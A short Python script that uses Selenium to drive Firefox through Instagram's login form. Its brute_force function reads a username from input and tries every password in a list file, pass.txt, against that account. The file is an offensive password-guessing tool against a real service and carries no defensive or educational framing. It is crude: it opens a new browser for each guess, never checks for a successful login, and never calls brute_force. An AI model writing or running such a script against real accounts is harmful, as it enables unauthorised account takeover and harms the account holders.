from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys


def login(username,password):
    d = webdriver.Firefox()
    d.get("https://www.instagram.com/")
    user = d.find_element(By.XPATH , "//*[@id='loginForm']/div/div[1]/div/label/input")
    pas = d.find_element(By.XPATH , "//*[@id='loginForm']/div/div[2]/div/label/input")
    user.send_keys(username)
    pas.send_keys(password)
    login_box = d.find_element(By.XPATH , "//*[@id='loginForm']/div/div[3]/button/div")
    login_box.click()
    #d.get(f"https://www.instagram.com/{username}")
def brute_force():
    u = input("enter username : ")
    with open("pass.txt" , "r") as f:
        for i in f:
            login(u, i)
